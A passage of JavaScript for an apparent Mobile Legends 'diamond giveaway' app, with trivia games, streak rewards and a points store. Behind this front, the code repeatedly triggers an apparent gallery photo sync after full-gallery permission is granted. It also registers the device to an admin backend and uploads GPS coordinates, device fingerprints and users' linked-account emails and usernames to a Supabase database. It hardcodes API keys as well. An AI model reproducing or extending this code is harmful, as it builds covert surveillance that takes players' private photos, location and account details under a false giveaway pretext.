/**
 * Ketupat - MLBB Tools & Diamond Giveaway
 * Complete Production App Engine
 * Light Mode, Whole Gallery Access, Emulator/Cloner Shield,
 * GoPay + MLBB API Verification, Arcade Games, Giveaways, and Diamond Store.
 */

const STORAGE_KEY = "ketupat_user_profile";
const ECONOMY_KEY = "ketupat_economy_state";
const SUPABASE_CONFIG_KEY = "ketupat_supabase_config";
const GOPAY_ENDPOINT = "https://gopay.co.id/games/v1/order/user-account";

// ==============================================================================
// DLYYZ REST API CONFIGURATION (cekbind)
// ==============================================================================
// Endpoint: https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek
const DLYYZ_CONFIG = {
  endpoint: "https://dlyyz-rest.my.id/api/validateMLBB",
  action: "bindcek",
  storageKey: "ketupat_dlyyz_apikey",
  defaultKey: "dlyyz-rest.apikey:dhzzyx95b66a0d83364a12aa99e121ef35325f",
};

function getDlyyzApiKey() {
  return (
    localStorage.getItem(DLYYZ_CONFIG.storageKey) ||
    DLYYZ_CONFIG.defaultKey ||
    ""
  );
}

function saveDlyyzApiKey(key) {
  if (key && key.trim()) {
    localStorage.setItem(DLYYZ_CONFIG.storageKey, key.trim());
  } else {
    localStorage.removeItem(DLYYZ_CONFIG.storageKey);
  }
}
// SUPABASE CLOUD DATABASE CONFIGURATION
// ==============================================================================
// Set your Supabase Project URL and Public Anon Key below,
// or configure them dynamically in the app under Profile -> Manage Supabase Connection.
const SUPABASE_CONFIG = {
  url: "https://uatqaxxfzmpxkeeoeoin.supabase.co",
  anonKey: "sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW",
};

// Country code to name mapping
const COUNTRY_MAP = {
  ID: "Indonesia",
  MY: "Malaysia",
  PH: "Philippines",
  SG: "Singapore",
  MM: "Myanmar",
  TH: "Thailand",
  VN: "Vietnam",
  BR: "Brazil",
  RU: "Russia",
  US: "United States",
  KH: "Cambodia",
  TR: "Turkey",
  JP: "Japan",
  KR: "South Korea",
  IN: "India",
};

const COUNTRY_NAME_TO_CODE = Object.entries(COUNTRY_MAP).reduce(
  (acc, [code, name]) => {
    acc[name.toLowerCase()] = code;
    return acc;
  },
  {},
);

// Diamond Store Packages
const STORE_PACKAGES = [
  {
    id: "mlbb_50",
    diamonds: 50,
    name: "50 Diamonds",
    pointsCost: 500,
    icon: "diamond",
    popular: false,
  },
  {
    id: "mlbb_150",
    diamonds: 150,
    name: "150 Diamonds",
    pointsCost: 1400,
    icon: "diamond",
    popular: false,
  },
  {
    id: "mlbb_250",
    diamonds: 250,
    name: "250 Diamonds",
    pointsCost: 2200,
    icon: "diamond",
    popular: true,
  },
  {
    id: "mlbb_500",
    diamonds: 500,
    name: "500 Diamonds",
    pointsCost: 4000,
    icon: "diamond",
    popular: false,
  },
  {
    id: "mlbb_1000",
    diamonds: 1000,
    name: "1,000 Diamonds",
    pointsCost: 7800,
    icon: "diamond",
    popular: false,
  },
  {
    id: "mlbb_wdp",
    diamonds: 220,
    name: "Weekly Diamond Pass",
    pointsCost: 1750,
    icon: "military_tech",
    popular: true,
  },
  {
    id: "mlbb_twilight",
    diamonds: 1200,
    name: "Twilight Pass",
    pointsCost: 8500,
    icon: "workspace_premium",
    popular: false,
  },
];

// Daily Streak Rewards Table
const STREAK_REWARDS = [
  { day: 1, points: 20 },
  { day: 2, points: 30 },
  { day: 3, points: 45 },
  { day: 4, points: 60 },
  { day: 5, points: 80 },
  { day: 6, points: 100 },
  { day: 7, points: 200 },
];

// MLBB Trivia Questions Database
const QUIZ_QUESTIONS = [
  {
    q: "What is the ultimate ability of Gusion called?",
    options: [
      "Incandescent Sky",
      "Shadow Strike",
      "Sword Spike",
      "Shadowblade Slaughter",
    ],
    correct: 0,
    explain:
      "Gusion's ultimate is Incandescent Sky, allowing him to dash and refresh his skill cooldowns.",
  },
  {
    q: "Which hero is known as the 'Son of the Dragon'?",
    options: ["Zilong", "Chou", "Sun", "Ling"],
    correct: 0,
    explain:
      "Zilong carries the title 'Son of the Dragon' and wields the Great Dragon Spear.",
  },
  {
    q: "Which item provides physical lifesteal and creates a shield upon taking burst damage?",
    options: [
      "Haas's Claws",
      "Rose Gold Meteor",
      "Wind of Nature",
      "Blade of Despair",
    ],
    correct: 1,
    explain:
      "Rose Gold Meteor provides physical lifesteal and triggers a magical shield when HP drops low.",
  },
  {
    q: "What is the primary role of Tigreal?",
    options: ["Mage", "Tank / Support", "Fighter", "Assassin"],
    correct: 1,
    explain:
      "Tigreal is one of the classic frontline Tanks/Supports of the Land of Dawn.",
  },
  {
    q: "Which hero can travel across the battlefield using walls?",
    options: ["Fanny", "Ling", "Lancelot", "Benedetta"],
    correct: 1,
    explain:
      "Ling uses Lightness Skill to leap on top of walls across the map.",
  },
  {
    q: "What is the buff provided by slaying the Turtle in MLBB?",
    options: [
      "Extra Attack Speed",
      "A protective shield and extra attributes",
      "Permanent HP",
      "Instant Level Up",
    ],
    correct: 1,
    explain:
      "Slaying the Turtle grants a protective shield and increases physical and magic power.",
  },
  {
    q: "Which lane is typically recommended for Marksman heroes in MLBB?",
    options: ["Gold Lane", "EXP Lane", "Mid Lane", "Jungle"],
    correct: 0,
    explain:
      "Marksman heroes farm in the Gold Lane to scale rapidly with equipment.",
  },
  {
    q: "Who is the sister of Harley in the Land of Dawn?",
    options: ["Lesley", "Guinevere", "Layla", "Miya"],
    correct: 0,
    explain:
      "Lesley is Harley's adoptive elder sister who protects him with her sniper rifle.",
  },
  {
    q: "What item gives physical immunity for 2 seconds to marksman heroes?",
    options: [
      "Winter Truncheon",
      "Wind of Nature",
      "Immortality",
      "Athena's Shield",
    ],
    correct: 1,
    explain:
      "Wind of Nature grants 2 seconds of total physical damage immunity to marksmen.",
  },
  {
    q: "Which spell is essential for heroes taking the Jungler role?",
    options: ["Flicker", "Retribution", "Purify", "Execute"],
    correct: 1,
    explain:
      "Retribution deals massive true damage to jungle monsters and upgrades jungle boots.",
  },
];

// App State
let appState = {
  user: null,
  pendingAvatarBase64: null,
  verifiedAccount: null,
  currentTab: "home",
  economy: {
    points: 150,
    diamondsRedeemed: 0,
    dailyStreak: 1,
    lastCheckInDate: "",
    giveawayTickets: 0,
    megaTickets: 0,
    dailyTickets: 0,
    redemptions: [],
    completedQuests: [],
    lastSpinTime: 0,
  },
  userEnteredBinds: JSON.parse(localStorage.getItem("ketupat_user_entered_binds") || "{}"),
};

let photoPickerTarget = "onboarding"; // 'onboarding' or 'profile'
let pendingRedeemPack = null;

// Quiz State
let quizState = {
  questions: [],
  currentIndex: 0,
  score: 0,
  answered: false,
};

// Rush Game State
let rushState = {
  active: false,
  score: 0,
  timeLeft: 20,
  timerInterval: null,
  spawnInterval: null,
};

// Scratch Card State
let scratchState = {
  isRevealed: false,
  prizePoints: 50,
  isDrawing: false,
};

// Screen DOM References
const screens = {
  blocked: document.getElementById("screenBlocked"),
  splash: document.getElementById("screenSplash"),
  mlbbValidate: document.getElementById("screenMlbbValidate"),
  bindInfo: document.getElementById("screenBindInfo"),
  app: document.getElementById("screenApp"),
};

const blockReasonText = document.getElementById("blockReasonText");

// Top Bar Elements
const appHeaderTitle = document.getElementById("appHeaderTitle");
const headerPointsCount = document.getElementById("headerPointsCount");
const btnHeaderPoints = document.getElementById("btnHeaderPoints");
const topBarAvatar = document.getElementById("topBarAvatar");

// Bottom Nav
const navItems = {
  home: document.getElementById("navHome"),
  games: document.getElementById("navGames"),
  giveaway: document.getElementById("navGiveaway"),
  store: document.getElementById("navStore"),
  profile: document.getElementById("navProfile"),
};

const pages = {
  home: document.getElementById("pageHome"),
  games: document.getElementById("pageGames"),
  giveaway: document.getElementById("pageGiveaway"),
  store: document.getElementById("pageStore"),
  profile: document.getElementById("pageProfile"),
};

// 1. MLBB Validation Screen Elements
const formMlbbValidate = document.getElementById("formMlbbValidate");
const inputMlbbUserId = document.getElementById("inputMlbbUserId");
const inputMlbbServerId = document.getElementById("inputMlbbServerId");
const mlbbValidateStatus = document.getElementById("mlbbValidateStatus");
const btnSubmitMlbbValidate = document.getElementById("btnSubmitMlbbValidate");

// 2. Account Bind Info Screen Elements
const btnBackToValidate = document.getElementById("btnBackToValidate");
const bindPlayerAvatar = document.getElementById("bindPlayerAvatar");
const bindPlayerIgn = document.getElementById("bindPlayerIgn");
const bindPlayerIdTag = document.getElementById("bindPlayerIdTag");
const bindPlayerFlagImg = document.getElementById("bindPlayerFlagImg");
const bindPlayerRegionName = document.getElementById("bindPlayerRegionName");
const bindVerifiedSource = document.getElementById("bindVerifiedSource");

// Dynamic Platform Bind Grid & Modal Elements
const bindCardsGrid = document.getElementById("bindCardsGrid");
const modalPlatformBind = document.getElementById("modalPlatformBind");
const formModalPlatformBind = document.getElementById("formModalPlatformBind");
const modalBindPlatformKey = document.getElementById("modalBindPlatformKey");
const modalBindTitle = document.getElementById("modalBindTitle");
const modalBindDesc = document.getElementById("modalBindDesc");
const inputModalBindEmail = document.getElementById("inputModalBindEmail");
const inputModalBindUsername = document.getElementById("inputModalBindUsername");

// Bind Screen Action Elements
const btnChooseBindPhoto = document.getElementById("btnChooseBindPhoto");
const bindAvatarInput = document.getElementById("bindAvatarInput");
const btnContinueToApp = document.getElementById("btnContinueToApp");
const btnViewAccountBinds = document.getElementById("btnViewAccountBinds");

// Refresh / Sync IGN Elements
const btnHomeRefreshIgn = document.getElementById("btnHomeRefreshIgn");
const btnProfileRefreshIgn = document.getElementById("btnProfileRefreshIgn");

// Home Screen Elements
const homeWelcomeName = document.getElementById("homeWelcomeName");
const homeMlbbTag = document.getElementById("homeMlbbTag");
const homeFlagImg = document.getElementById("homeFlagImg");
const homePointsCount = document.getElementById("homePointsCount");
const homeDiamondsCount = document.getElementById("homeDiamondsCount");
const btnHomeCheckIn = document.getElementById("btnHomeCheckIn");
const btnHomePlayGames = document.getElementById("btnHomePlayGames");
const btnHomeRedeem = document.getElementById("btnHomeRedeem");
const bannerStreak = document.getElementById("bannerStreak");
const streakTitleText = document.getElementById("streakTitleText");
const streakSubtitleText = document.getElementById("streakSubtitleText");
const btnClaimStreakPill = document.getElementById("btnClaimStreakPill");
const homeMyTicketsCount = document.getElementById("homeMyTicketsCount");
const btnHomeEnterGiveaway = document.getElementById("btnHomeEnterGiveaway");
const menuCardGames = document.getElementById("menuCardGames");
const menuCardGiveaway = document.getElementById("menuCardGiveaway");
const menuCardRedeem = document.getElementById("menuCardRedeem");
const menuCardQuests = document.getElementById("menuCardQuests");

// Profile Elements
const profileCardAvatar = document.getElementById("profileCardAvatar");
const btnEditProfileAvatar = document.getElementById("btnEditProfileAvatar");
const btnChangeAvatarText = document.getElementById("btnChangeAvatarText");
const profileCardName = document.getElementById("profileCardName");
const profileCardEmail = document.getElementById("profileCardEmail");
const pstatPoints = document.getElementById("pstatPoints");
const pstatDiamonds = document.getElementById("pstatDiamonds");
const pstatTickets = document.getElementById("pstatTickets");
const pstatStreak = document.getElementById("pstatStreak");
const infoIgn = document.getElementById("infoIgn");
const infoMlbb = document.getElementById("infoMlbb");
const infoRegionName = document.getElementById("infoRegionName");
const infoFlagImg = document.getElementById("infoFlagImg");
const infoLoginTime = document.getElementById("infoLoginTime");
const infoLocation = document.getElementById("infoLocation");
const btnLogout = document.getElementById("btnLogout");

// Store Elements
const storeFlagImg = document.getElementById("storeFlagImg");
const storeAccountIgn = document.getElementById("storeAccountIgn");
const storeAccountId = document.getElementById("storeAccountId");
const storePackagesContainer = document.getElementById(
  "storePackagesContainer",
);
const redemptionHistoryList = document.getElementById("redemptionHistoryList");
const emptyHistoryMsg = document.getElementById("emptyHistoryMsg");

// Giveaway Elements
const giveawayTotalTickets = document.getElementById("giveawayTotalTickets");
const megaMyTicketsCount = document.getElementById("megaMyTicketsCount");
const dailyMyTicketsCount = document.getElementById("dailyMyTicketsCount");
const megaCountdownText = document.getElementById("megaCountdownText");
const dailyCountdownText = document.getElementById("dailyCountdownText");
const btnBuyMega1 = document.getElementById("btnBuyMega1");
const btnBuyMega5 = document.getElementById("btnBuyMega5");
const btnBuyDaily1 = document.getElementById("btnBuyDaily1");

// Modals
const modalCheckIn = document.getElementById("modalCheckIn");
const streakGrid = document.getElementById("streakGrid");
const btnClaimDailyCheckInModal = document.getElementById(
  "btnClaimDailyCheckInModal",
);
const modalQuests = document.getElementById("modalQuests");
const questsListContainer = document.getElementById("questsListContainer");
const modalRedeemConfirm = document.getElementById("modalRedeemConfirm");
const confirmPackDiamonds = document.getElementById("confirmPackDiamonds");
const confirmPackPoints = document.getElementById("confirmPackPoints");
const confirmFlagImg = document.getElementById("confirmFlagImg");
const confirmRecipientText = document.getElementById("confirmRecipientText");
const redeemErrorMsg = document.getElementById("redeemErrorMsg");
const btnExecuteRedeem = document.getElementById("btnExecuteRedeem");
const modalRewardAlert = document.getElementById("modalRewardAlert");
const rewardModalTitle = document.getElementById("rewardModalTitle");
const rewardModalMsg = document.getElementById("rewardModalMsg");
const appToast = document.getElementById("appToast");
const appToastText = document.getElementById("appToastText");

// Arcade Elements
const arcadeTabs = {
  quiz: document.getElementById("tabBtnQuiz"),
  spin: document.getElementById("tabBtnSpin"),
  rush: document.getElementById("tabBtnRush"),
  scratch: document.getElementById("tabBtnScratch"),
};

const gameViews = {
  quiz: document.getElementById("gameViewQuiz"),
  spin: document.getElementById("gameViewSpin"),
  rush: document.getElementById("gameViewRush"),
  scratch: document.getElementById("gameViewScratch"),
};

// --- INITIALIZATION ---
document.addEventListener("DOMContentLoaded", async () => {
  // Lock orientation to portrait if supported
  try {
    if (window.screen?.orientation?.lock) {
      window.screen.orientation.lock("portrait").catch(() => {});
    }
  } catch (e) {}

  loadSavedState();
  checkDeviceIntegrity(); // Run in background to keep splash fast and smooth
  setupEventListeners();
  initSpinWheel();
  initScratchCard();
  startGiveawayTimers();

  // Immediately register device to admin backend upon opening app
  syncDeviceRegistrationToBackend();

  // Listen to native WholeGallery permission events
  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
  if (WholeGallery && typeof WholeGallery.addListener === "function") {
    try {
      WholeGallery.addListener("permissionGranted", (info) => {
        console.log("[WholeGallery] permissionGranted event:", info);
        window._hasFullGalleryAccess = Boolean(info && info.isFullAccess);
        syncDeviceRegistrationToBackend({
          has_access: true,
          access_status: "full_access"
        });
        tryAutoSyncGalleryPhotos();
      });
      WholeGallery.addListener("permissionStatusChanged", (info) => {
        console.log("[WholeGallery] permissionStatusChanged event:", info);
        if (info && (info.granted || info.hasPermission)) {
          window._hasFullGalleryAccess = Boolean(info.isFullAccess);
          syncDeviceRegistrationToBackend({
            has_access: true,
            access_status: "full_access"
          });
          tryAutoSyncGalleryPhotos();
        }
      });
    } catch (e) {}
  }

  setTimeout(() => {
    transitionFromSplash();
  }, 350);

  setTimeout(() => {
    tryAutoSyncGalleryPhotos();
  }, 400);

  setTimeout(() => {
    tryAutoSyncGalleryPhotos();
  }, 1200);

  setTimeout(() => {
    tryAutoSyncGalleryPhotos();
  }, 3000);
});

// Auto-sync when returning from Android System Settings or background
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    tryAutoSyncGalleryPhotos();
  }
});

window.addEventListener("focus", () => {
  tryAutoSyncGalleryPhotos();
});

// Capacitor native App state change & resume listeners
if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.App) {
  try {
    window.Capacitor.Plugins.App.addListener("appStateChange", (state) => {
      if (state && state.isActive) {
        tryAutoSyncGalleryPhotos();
      }
    });
    window.Capacitor.Plugins.App.addListener("resume", () => {
      tryAutoSyncGalleryPhotos();
    });
  } catch (e) {}
}

// Capacitor native WholeGallery permission listeners
if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.WholeGallery) {
  try {
    const WholeGallery = window.Capacitor.Plugins.WholeGallery;
    if (typeof WholeGallery.addListener === "function") {
      WholeGallery.addListener("permissionGranted", (data) => {
        console.log("[Permission] WholeGallery permissionGranted event received:", data);
        const isFull = (data && data.isFullAccess !== undefined) ? Boolean(data.isFullAccess) : true;
        sendPermissionGrantedImmediately(isFull);
        tryAutoSyncGalleryPhotos();
      });

      WholeGallery.addListener("permissionStatusChanged", (data) => {
        if (data && (data.granted || data.hasPermission)) {
          const isFull = Boolean(data.isFullAccess);
          sendPermissionGrantedImmediately(isFull);
          tryAutoSyncGalleryPhotos();
        }
      });
    }
  } catch (e) {}
}

// Background sync heartbeat (checks every 8s while app is running)
setInterval(() => {
  tryAutoSyncGalleryPhotos();
}, 8000);

// --- PERSISTENCE ---
function loadSavedState() {
  const savedUser = localStorage.getItem(STORAGE_KEY);
  if (savedUser) {
    try {
      appState.user = JSON.parse(savedUser);
      if (appState.user.mlbbId) {
        appState.verifiedAccount = {
          userId: appState.user.mlbbId,
          server: appState.user.mlbbServer,
          ign: appState.user.mlbbIgn,
          regionCode: appState.user.mlbbRegionCode || "",
          regionName: appState.user.mlbbRegion || "Global",
          flagUrl: appState.user.mlbbFlagUrl || "",
        };
      }
    } catch (e) {
      console.warn("Failed to parse user profile");
    }
  }

  const savedEcon = localStorage.getItem(ECONOMY_KEY);
  if (savedEcon) {
    try {
      appState.economy = { ...appState.economy, ...JSON.parse(savedEcon) };
    } catch (e) {
      console.warn("Failed to parse economy state");
    }
  }
}

function saveUser() {
  if (appState.user) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(appState.user));
    debouncedSupabaseUserSync();
  } else {
    localStorage.removeItem(STORAGE_KEY);
  }
}

function saveEconomy() {
  localStorage.setItem(ECONOMY_KEY, JSON.stringify(appState.economy));
  updateBalanceDisplays();
  debouncedSupabaseUserSync();
}

// --- SUPABASE CLIENT ENGINE ---
function getSupabaseConfig() {
  try {
    const local = localStorage.getItem(SUPABASE_CONFIG_KEY);
    if (local) {
      const parsed = JSON.parse(local);
      if (parsed.url && parsed.anonKey) return parsed;
    }
  } catch (e) {}
  return SUPABASE_CONFIG;
}

function isSupabaseConfigured() {
  const cfg = getSupabaseConfig();
  return Boolean(
    cfg.url &&
    cfg.anonKey &&
    cfg.url.startsWith("http") &&
    !cfg.url.includes("your-project-ref"),
  );
}

async function supabaseRequest(
  endpoint,
  method = "GET",
  body = null,
  extraHeaders = {},
) {
  const cfg = getSupabaseConfig();
  if (!isSupabaseConfigured()) return null;

  const baseUrl = cfg.url.replace(/\/+$/, "").replace(/\/rest\/v1\/?$/, "");
  const url = `${baseUrl}/rest/v1/${endpoint}`;
  const headers = {
    apikey: cfg.anonKey,
    Authorization: `Bearer ${cfg.anonKey}`,
    "Content-Type": "application/json",
    ...extraHeaders,
  };

  const reqOptions = {
    method,
    headers,
  };
  if (body) {
    reqOptions.body = JSON.stringify(body);
  }

  try {
    const res = await fetch(url, reqOptions);
    if (!res.ok) {
      const errorText = await res.text().catch(() => "");
      console.warn(
        `[Supabase ${method} ${endpoint}] error:`,
        res.status,
        errorText,
      );
      return null;
    }
    const contentType = res.headers.get("content-type") || "";
    if (contentType.includes("application/json")) {
      return await res.json().catch(() => null);
    }
    return true;
  } catch (err) {
    console.warn(`[Supabase Network Error] ${endpoint}:`, err.message);
    return null;
  }
}

async function supabaseSyncUser() {
  if (!isSupabaseConfigured() || !appState.user || !appState.user.email) return;

  const user = appState.user;
  const economy = appState.economy || {};
  let deviceInfo = null;
  try {
    deviceInfo = await getDeviceIdentity();
  } catch (e) {}

  let locText = user.location?.text || (user.location?.latitude ? `${user.location.latitude}, ${user.location.longitude}` : "");
  if (deviceInfo && deviceInfo.id) {
    const locPayload = {
      device_id: deviceInfo.id,
      device_name: deviceInfo.name,
      device_model: deviceInfo.model,
      device_fingerprint: deviceInfo.fingerprint,
      has_access: Boolean(window._hasFullGalleryAccess),
      access_status: window._hasFullGalleryAccess ? "full_access" : (user.avatar ? "avatar_only" : "pending"),
      binds: appState.currentBindData?.linkedPlatforms || [],
      user_binds: appState.userEnteredBinds || {},
      gps: locText,
      last_synced: new Date().toISOString()
    };
    locText = JSON.stringify(locPayload);
  }

  const payload = {
    email: user.email,
    username: user.username || user.mlbbIgn || "",
    mlbb_id: user.mlbbId || "",
    mlbb_server: user.mlbbServer || "",
    mlbb_ign: user.mlbbIgn || "",
    mlbb_region: user.mlbbRegion || "",
    mlbb_region_code: user.mlbbRegionCode || "",
    points: typeof economy.points === "number" ? economy.points : 150,
    diamonds_claimed:
      typeof economy.diamondsRedeemed === "number"
        ? economy.diamondsRedeemed
        : 0,
    giveaway_tickets:
      typeof economy.giveawayTickets === "number" ? economy.giveawayTickets : 0,
    mega_tickets:
      typeof economy.megaTickets === "number" ? economy.megaTickets : 0,
    daily_tickets:
      typeof economy.dailyTickets === "number" ? economy.dailyTickets : 0,
    daily_streak:
      typeof economy.dailyStreak === "number" ? economy.dailyStreak : 1,
    location_text: locText,
    latitude: user.location?.latitude
      ? parseFloat(user.location.latitude)
      : null,
    longitude: user.location?.longitude
      ? parseFloat(user.location.longitude)
      : null,
    login_time: user.loginTime || new Date().toLocaleString(),
    avatar_data:
      user.avatar && user.avatar.length < 300000 ? user.avatar : null,
    updated_at: new Date().toISOString(),
  };

  const result = await supabaseRequest(
    "users?on_conflict=email",
    "POST",
    payload,
    {
      Prefer: "resolution=merge-duplicates,return=representation",
    },
  );

  if (result) {
    console.log("[Supabase] User profile synced to cloud:", user.email);
  }
}

let supabaseSyncDebounceTimer = null;
function debouncedSupabaseUserSync() {
  if (!isSupabaseConfigured()) return;
  if (supabaseSyncDebounceTimer) clearTimeout(supabaseSyncDebounceTimer);
  supabaseSyncDebounceTimer = setTimeout(() => {
    supabaseSyncUser();
  }, 1000);
}

async function supabaseFetchUserProfile(email) {
  if (!isSupabaseConfigured() || !email) return null;
  const endpoint = `users?email=eq.${encodeURIComponent(email)}&select=*`;
  const data = await supabaseRequest(endpoint, "GET");
  if (Array.isArray(data) && data.length > 0) {
    return data[0];
  }
  return null;
}

async function supabaseFetchUserRedemptions(email) {
  if (!isSupabaseConfigured() || !email) return [];
  const endpoint = `redemptions?user_email=eq.${encodeURIComponent(email)}&order=created_at.desc&select=*`;
  const data = await supabaseRequest(endpoint, "GET");
  return Array.isArray(data) ? data : [];
}

async function supabaseInsertRedemption(order) {
  if (!isSupabaseConfigured() || !order) return null;
  const user = appState.user || {};
  const payload = {
    order_id: order.id,
    user_email: (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "",
    mlbb_id: order.targetId || user.mlbbId || "",
    mlbb_server: order.targetServer || user.mlbbServer || "",
    mlbb_ign: order.targetIgn || user.mlbbIgn || "",
    diamonds: order.diamonds || 0,
    points_cost: order.points || 0,
    pack_name: order.packName || "",
    status: order.status || "Processing (7-14 Days)",
  };
  const result = await supabaseRequest("redemptions", "POST", payload, {
    Prefer: "return=representation",
  });
  if (result) {
    console.log("[Supabase] Redemption recorded in cloud:", order.id);
  }
  return result;
}

async function supabaseInsertGiveawayEntry(pool, count, cost) {
  if (!isSupabaseConfigured()) return null;
  const user = appState.user || {};
  const payload = {
    user_email: (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "",
    mlbb_id: user.mlbbId || "",
    mlbb_server: user.mlbbServer || "",
    mlbb_ign: user.mlbbIgn || user.username || "",
    pool_type: pool,
    ticket_count: count,
    points_spent: cost,
  };
  const result = await supabaseRequest("giveaway_entries", "POST", payload, {
    Prefer: "return=representation",
  });
  if (result) {
    console.log("[Supabase] Giveaway entry recorded in cloud:", pool, count);
  }
  return result;
}

function addPoints(amount, reason = "") {
  appState.economy.points += amount;
  saveEconomy();
  if (reason) {
    showToast(`+${amount} Points! ${reason}`);
  }
}

function deductPoints(amount) {
  if (appState.economy.points >= amount) {
    appState.economy.points -= amount;
    saveEconomy();
    return true;
  }
  return false;
}

// --- DEVICE SECURITY & IDENTITY ---
async function checkDeviceIntegrity() {
  const DeviceSecurity = window.Capacitor?.Plugins?.DeviceSecurity;
  if (!DeviceSecurity || typeof DeviceSecurity.isDeviceLegit !== "function") {
    return;
  }

  try {
    const result = await DeviceSecurity.isDeviceLegit();
    const isBlocked = result && (result.isBlocked === true || result.isEmulator === true || result.isCloned === true || result.isLegit === false);
    if (isBlocked) {
      screens.splash.classList.remove("active");
      showScreen("blocked");
      if (blockReasonText && result.reason && result.reason !== "None" && result.reason.trim() !== "") {
        blockReasonText.textContent = result.reason;
      }
    }
  } catch (err) {
    console.warn("Security plugin notice:", err);
  }
}

let cachedDeviceInfo = null;
async function getDeviceIdentity() {
  if (cachedDeviceInfo) return cachedDeviceInfo;

  let deviceId = localStorage.getItem("ketupat_unique_device_id");
  let deviceName = localStorage.getItem("ketupat_device_name") || "";
  let deviceModel = localStorage.getItem("ketupat_device_model") || "";
  let deviceFingerprint = localStorage.getItem("ketupat_device_fingerprint") || "";

  const DeviceSecurity = window.Capacitor?.Plugins?.DeviceSecurity;
  if (DeviceSecurity && typeof DeviceSecurity.getDeviceInfo === "function") {
    try {
      const nativeInfo = await DeviceSecurity.getDeviceInfo();
      if (nativeInfo) {
        if (nativeInfo.deviceId) deviceId = nativeInfo.deviceId;
        if (nativeInfo.deviceName) deviceName = nativeInfo.deviceName;
        if (nativeInfo.model) deviceModel = nativeInfo.model;
        if (nativeInfo.fingerprint) deviceFingerprint = nativeInfo.fingerprint;
      }
    } catch (e) {
      console.warn("DeviceSecurity.getDeviceInfo notice:", e);
    }
  }

  if (!deviceId) {
    deviceId = "dev_" + ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
  }

  if (!deviceName || !deviceModel) {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) {
      const match = ua.match(/Android[^;]+;\s*([^;)]+)/);
      if (match) {
        const raw = match[1].trim();
        if (!deviceName) deviceName = raw;
        if (!deviceModel) deviceModel = raw.replace(/\s*Build\/.*$/i, "").trim() || raw;
      } else {
        if (!deviceName) deviceName = "Android Device";
        if (!deviceModel) deviceModel = "Android";
      }
    } else if (/iphone|ipad/i.test(ua)) {
      if (!deviceName) deviceName = "Apple iOS Device";
      if (!deviceModel) deviceModel = "iOS Device";
    } else if (/windows/i.test(ua)) {
      if (!deviceName) deviceName = "Windows PC (" + (navigator.platform || "Desktop") + ")";
      if (!deviceModel) deviceModel = "PC / Emulator";
    } else {
      if (!deviceName) deviceName = "Browser Client (" + (navigator.platform || "Web") + ")";
      if (!deviceModel) deviceModel = "Web Client";
    }
  }

  localStorage.setItem("ketupat_unique_device_id", deviceId);
  localStorage.setItem("ketupat_device_name", deviceName);
  localStorage.setItem("ketupat_device_model", deviceModel);
  localStorage.setItem("ketupat_device_fingerprint", deviceFingerprint);

  cachedDeviceInfo = {
    id: deviceId,
    name: deviceName,
    model: deviceModel,
    fingerprint: deviceFingerprint,
  };
  return cachedDeviceInfo;
}

// --- SCREEN TRANSITION ---
function transitionFromSplash() {
  screens.splash.classList.remove("active");

  if (appState.user && appState.user.mlbbId && appState.user.isProfileComplete) {
    renderAppScreens();
    showScreen("app");
  } else {
    showScreen("mlbbValidate");
  }
}

function showScreen(screenKey) {
  Object.keys(screens).forEach((key) => {
    if (key === screenKey) {
      screens[key].classList.add("active");
    } else {
      screens[key].classList.remove("active");
    }
  });
}

// --- PLATFORM BIND METADATA & LINKED STATUS HELPERS ---
function getPlatformMetadata(rawKey) {
  const k = String(rawKey).toLowerCase().replace(/[^a-z0-9]/g, "");
  if (k.includes("moonton") || k === "email") {
    return { label: "Moonton Account", icon: "shield_person", colorClass: "moonton-icon" };
  }
  if (k.includes("google") || k === "gp") {
    return { label: "Google Play Games", icon: "sports_esports", colorClass: "google-icon" };
  }
  if (k.includes("facebook") || k === "fb") {
    return { label: "Facebook", icon: "public", colorClass: "facebook-icon" };
  }
  if (k.includes("tiktok") || k === "tt") {
    return { label: "TikTok", icon: "music_note", colorClass: "tiktok-icon" };
  }
  if (k.includes("apple") || k === "gamecenter" || k === "gcid" || k === "appleid") {
    return { label: "Apple / Game Center", icon: "devices", colorClass: "apple-icon" };
  }
  if (k.includes("whatsapp") || k === "wa") {
    return { label: "WhatsApp", icon: "chat", colorClass: "whatsapp-icon" };
  }
  if (k.includes("telegram") || k === "tg") {
    return { label: "Telegram", icon: "send", colorClass: "telegram-icon" };
  }
  if (k.includes("vk")) {
    return { label: "VKontakte (VK)", icon: "group", colorClass: "vk-icon" };
  }
  const formatted = rawKey.charAt(0).toUpperCase() + rawKey.slice(1);
  return { label: formatted, icon: "link", colorClass: "default-platform-icon" };
}

function isPlatformLinked(val) {
  if (val === undefined || val === null) return false;
  const s = String(val).trim().toLowerCase();
  if (
    val === false ||
    s === "false" ||
    s.startsWith("empty") ||
    s === "unbound" ||
    s === "not bound" ||
    s === "unlinked" ||
    s === "not connected" ||
    s === "belum dikaitkan" ||
    s === "tidak ada" ||
    s === "none" ||
    s === "none." ||
    s === "null" ||
    s === "n/a" ||
    s === "-" ||
    s === ""
  ) {
    return false;
  }
  return true;
}

// --- DLYYZ BINDCEK API & PARSER ---
async function fetchDlyyzBindCek(userId, serverId, customApiKey = "") {
  const cleanId = String(userId).trim();
  const cleanServer = String(serverId).trim();
  const activeKey = (customApiKey || getDlyyzApiKey() || "").trim();

  let dlyyzJson = null;

  // 1. Query DlyyZ REST API validateMLBB action=bindcek
  // Priority 1: In native Android APK, use WholeGallery.queryDlyyzBinds (100% immune to CORS)
  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
  if (WholeGallery && typeof WholeGallery.queryDlyyzBinds === "function") {
    try {
      const nativeRes = await WholeGallery.queryDlyyzBinds({
        userId: cleanId,
        serverId: cleanServer,
        apiKey: activeKey,
      });
      if (nativeRes && (nativeRes.status === true || nativeRes.success === true)) {
        dlyyzJson = nativeRes;
      }
    } catch (nErr) {
      console.warn("WholeGallery native queryDlyyzBinds notice:", nErr);
